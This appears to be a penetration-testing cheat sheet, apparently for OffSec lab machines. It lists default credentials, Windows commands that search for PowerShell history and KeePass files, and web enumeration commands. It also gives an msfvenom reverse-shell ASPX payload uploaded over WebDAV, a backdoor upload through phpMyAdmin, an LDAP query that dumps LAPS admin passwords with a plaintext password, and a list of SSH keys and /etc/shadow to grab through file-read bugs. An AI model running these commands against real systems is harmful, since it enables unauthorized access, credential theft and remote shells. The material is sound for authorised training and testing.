# Default Credentials
admin:admin
admin:password
admin:null
root:root
root:password
root:null
platform:platform

# Windows juicy files 
```bash
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-History
(Get-PSReadlineOption).HistorySavePath

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

```

# HTTP/HTTPS(80,8080,8000,443...)

## wappalyzer

## gobuster
```bash
gobuster dir -u http://192.168.216.122/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,pdf
```

## feroxbuster (must add -x 
```bash
└─# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.216.10/ -x php,aspx,jsp,pdf -C 404,401,403 
```



## nikto: find webdav
```bash
nikto -h http://192.168.222.122
```


## cadaver(username,password required)
```bash
# first create a reverse shell(asp, aspx)
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f aspx > shell.aspx

# connect to cadaver
cadaver http://10.3.20.218/webdav
put /root/offsec/shell.aspx
```


## wpscan: wordpress
```bash

```


## phpmyadmin: default password
- use default password(password can be null)
- upload php uploader: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
- upload simple-backdoor.php through SQL



# PORT 445: SMb
## crackmapexec smb
```bash
crackmapexec smb 192.168.216.165 -u 'enox' -p '' --shares
```


# PORT 389,3268: LDAP
## ldapsearch: focus on samaccount and description
```bash
# unauthenticated
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'

# authenticated(LAPS found from SYSVOL)
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```


# SNMP(161)
```bash
snmpwalk -c public -v1 192.168.x.x
snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```


# File Read Exploit
- If the server is running with NY SYSTEM or sudo(root), we can grab any files
- Check SSH Keys [id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, id_dsa]
  - /home/username/{id_rsa}
  - /home/username/.ssh/{id_rsa}  
- find password files for other program that's running(for authenticated exploit that we can actually get reverse shell)
- /etc/passwd
- /etc/shadow
- /home/username/.bash_history
- /home/username/.bash_aliases


